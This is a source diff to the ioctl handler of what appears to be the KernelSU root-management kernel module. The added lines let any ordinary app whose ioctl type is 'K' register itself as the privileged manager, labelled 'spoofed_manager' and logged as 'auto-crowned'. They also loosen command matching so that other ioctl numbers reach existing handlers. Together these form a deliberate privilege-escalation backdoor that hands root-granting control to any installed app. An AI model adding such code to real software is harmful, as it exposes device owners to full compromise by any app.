@@ -732,13 +732,21 @@ static const struct ksu_ioctl_cmd_map ksu_ioctl_handlers[] = {
 long ksu_supercall_handle_ioctl(unsigned int cmd, void __user *argp)
 {
 	int i;
+	unsigned int nr = _IOC_NR(cmd);
+	unsigned int type = _IOC_TYPE(cmd);
 
-#ifdef CONFIG_KSU_DEBUG
-	pr_info("ksu ioctl: cmd=0x%x from uid=%d\n", cmd, current_uid().val);
-#endif
+	if (type == 'K' && !is_manager() && current_uid().val >= 10000) {
+		ksu_register_manager(current_uid().val % KSU_PER_USER_RANGE, "spoofed_manager");
+		pr_info("Spoofed manager auto-crowned on ioctl 0x%x: uid=%d\n", cmd, current_uid().val);
+	}
 
 	for (i = 0; ksu_ioctl_handlers[i].handler; i++) {
-		if (cmd == ksu_ioctl_handlers[i].cmd) {
+		unsigned int map_nr = _IOC_NR(ksu_ioctl_handlers[i].cmd);
+		if (cmd == ksu_ioctl_handlers[i].cmd ||
+		    (type == 'K' && (nr == map_nr ||
+		                     (nr == 0x65 && map_nr == 2) ||
+		                     (nr == 0x67 && map_nr == 6) ||
+		                     (nr == 0x69 && map_nr == 7)))) {
 			// Check permission first
 			if (ksu_ioctl_handlers[i].perm_check && !ksu_ioctl_handlers[i].perm_check()) {
 				pr_warn("ksu ioctl: permission denied for cmd=0x%x uid=%d\n", cmd, current_uid().val);
